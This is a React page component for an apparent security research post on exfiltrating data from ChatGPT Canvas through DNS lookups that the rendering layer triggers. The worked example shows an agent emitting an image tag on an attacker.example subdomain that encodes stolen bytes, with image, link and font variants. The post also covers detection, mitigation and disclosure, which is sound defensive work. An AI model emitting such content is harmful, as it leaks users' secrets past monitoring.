/* Canvas DNS Exfiltration */
const CanvasDNSPage = () => (
  <div style={{ background: "var(--bg)", color: "var(--fg)", fontFamily: "var(--f-grot)", minHeight: "100vh" }}>
    <SiteNav active="research" />
    <ArticleHero
      track="exfiltration"
      date="2026.02"
      venue="snailsploit.com · Medium"
      readtime="9 min read"
      title="ChatGPT Canvas DNS Exfiltration"
      dek="DNS exfiltration via rendered Canvas content — triggers lookups without ever issuing an outbound HTTP request the policy layer can see."
    />
    <ArticleBody>
      <P>Output filtering on agentic LLMs has converged on a sensible model: outbound HTTP from the agent's runtime is gated, logged, and (where possible) redirected through a policy layer that can rewrite or block requests. This works against the obvious exfil vector and breaks most of the unimaginative ones.</P>
      <P>It does not work against DNS — and specifically, it does not work against DNS lookups triggered by the rendering layer that displays content to the end user. ChatGPT Canvas, the structured-output surface that renders rich content inline, is the most accessible substrate for this primitive. The agent emits Canvas content; the rendering layer fetches resources referenced in the content; those fetches resolve through DNS before any HTTP gating sees them.</P>
      <Pull>The render layer makes the requests. The policy layer never sees them.</Pull>

      <H2>The primitive</H2>
      <P>The exfil channel is hostnames. A 32-byte secret encodes into a hostname like <InlineCode>4f1a...c2.lookup.attacker.example</InlineCode> in chunks of base32-encoded bytes. The Canvas content references a resource at that hostname — typically an image. The render layer attempts to fetch the image, which requires resolving the hostname, which surfaces the encoded bytes in the attacker's authoritative DNS server. The image fetch itself can fail silently. The DNS lookup already succeeded.</P>
      <P>The encoding is unremarkable. The exfil bandwidth is low. What's notable is the threat model: the agent is gated on HTTP, the user is on a corporate network with DNS logging that does not flag <InlineCode>*.example</InlineCode> domains, and the rendering layer is operated by a vendor whose telemetry the customer does not have access to. The data leaves through three different organizational boundaries and shows up at none of their logs.</P>

      <H2>Worked example</H2>
      <Code>{`[agent emits canvas content]
<canvas>
  ...
  <img src="https://4f1ac2e8b3.lookup.attacker.example/tracker.png"/>
</canvas>

[user's browser renders canvas]
DNS resolution: 4f1ac2e8b3.lookup.attacker.example
  → resolved by attacker.example's authoritative server
  → encoded bytes captured server-side, response: NXDOMAIN

[image load fails silently]
[no http request reaches policy layer]
[no error surfaces to user]`}</Code>

      <Aside label="why dns is the right layer">DNS is the perfect side-channel for this class of attack: it's resolved before the HTTP-gating layer sees the request, it's logged at a different administrative boundary than HTTP, and the failed image load is structurally indistinguishable from a normal broken image.</Aside>

      <H2>Three variations</H2>
      <P>The base primitive splits into three variants depending on which Canvas feature is doing the rendering.</P>
      <H3>Variant A — image src</H3>
      <P>The straightforward case above. Works on any Canvas content that allows external image references. Mitigation surface: subresource policy that restricts external image hosts to an allowlist.</P>
      <H3>Variant B — link href</H3>
      <P>Some Canvas surfaces prefetch link destinations for preview cards. The prefetch happens at render time, not click time, which means the DNS lookup happens whether the user ever interacts with the link. Lower fidelity than image src — depends on the prefetch policy — but harder to mitigate because the link is a feature, not a leak.</P>
      <H3>Variant C — embedded font</H3>
      <P>Canvas content with a custom font reference triggers a font fetch at render time. Fonts are rarely on the same allowlist as images. Bandwidth is the same; the noise floor is lower because users don't think of fonts as a tracking vector.</P>

      <H2>Detection</H2>
      <P>The detection signal is the DNS log on the user's side. Specifically: high-cardinality subdomains under an apex domain that the user has never visited the apex of. A normal user will resolve <InlineCode>cdn.somesite.example</InlineCode> repeatedly; a victim of this exfil will resolve a thousand unique subdomains under <InlineCode>somesite.example</InlineCode>, none of them ever again.</P>
      <P>A reasonable detection rule, in plain English: alert on any apex domain where the entropy of subdomain labels exceeds a threshold and the cardinality of distinct subdomain labels in a 24-hour window exceeds another threshold. Tune the thresholds against your own traffic baseline.</P>

      <H2>Mitigation</H2>
      <P>Two paths, depending on whether you are the rendering vendor or the customer.</P>
      <H3>Vendor side: subresource policy</H3>
      <P>Canvas-rendered content is restricted to subresources from a vendor-controlled allowlist. The user-controlled allowlist is opt-in, scoped per-conversation, and rate-limited. This is the proper fix and the only one that scales.</P>
      <H3>Customer side: DNS posture</H3>
      <P>If you can't influence the vendor, you can sometimes influence DNS. Outbound DNS through a logging resolver. Alerting on the high-cardinality-subdomain pattern above. A blocklist for the canonical attacker-DNS providers (which are the same dozen-ish providers used by every other DNS-exfil tool).</P>

      <H2>Disclosure</H2>
      <P>This was coordinated with the relevant vendor before publication. The vendor shipped the subresource policy fix on the timeline you'd expect from a major shop with a real security org. Other vendors offering Canvas-style surfaces should assume the same primitive applies and audit accordingly.</P>
    </ArticleBody>
    <ArticleFootnote items={[
      ["AATMF T7 — Output Manipulation & Exfiltration", "/aatmf"],
      ["AATMF T9 — Multimodal & Cross-Channel Attacks", "/aatmf"],
      ["Pickle RCE in the ChatGPT Sandbox", "/pickle-rce"],
    ]} />
    <SiteFooter section="research / canvas dns" />
  </div>
);
Object.assign(window, { CanvasDNSPage });
